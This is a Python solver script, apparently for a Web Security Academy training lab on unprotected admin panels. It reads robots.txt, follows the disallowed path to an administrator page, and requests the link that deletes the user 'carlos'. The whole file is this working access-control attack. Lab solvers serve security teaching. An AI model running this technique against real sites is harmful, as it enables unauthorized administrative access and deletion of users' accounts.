from web_security_academy.core.utils import *
from bs4 import BeautifulSoup
from urllib.parse import urljoin

import re


def solve_lab(session, *args):
    # robots.txt
    url = urljoin(session.url, "/robots.txt")
    print_info(f'Visiting "{url}"...')
    resp = session.get(url)
    if resp.status_code != 200:
        print_fail(f"Unable to visit URL.")
    else:
        print_success("GET request came back with the following response:\n")
        print(resp.text)

    # Extracting and visiting /administrator-panel
    match = re.search(r"Disallow: (.*)\n", resp.text)
    if match is None:
        print_fail("Unable to find administrative URL.")
    else:
        url = urljoin(url, match.group(1))

    print_info(f'Visiting "{url}"...')
    resp = session.get(url)
    if resp.status_code != 200:
        print_fail(f"Unable to visit URL.")
    else:
        print_success("GET request came back with a successful response.\n")

    # Deleting user carlos
    print_info("Using the response to find URL to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "html.parser")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))
    if tag is None:
        print_fail("Unable to find URL.")
    else:
        url = urljoin(url, tag.get("href"))
        print_success(f"Found URL: {url}\n")

    print_info("Visiting URL to delete the user carlos...")
    resp = session.get(url)
    if resp.status_code != 200:
        print_fail(f"GET request unsuccessful.")
    else:
        print_success("Success.\n")
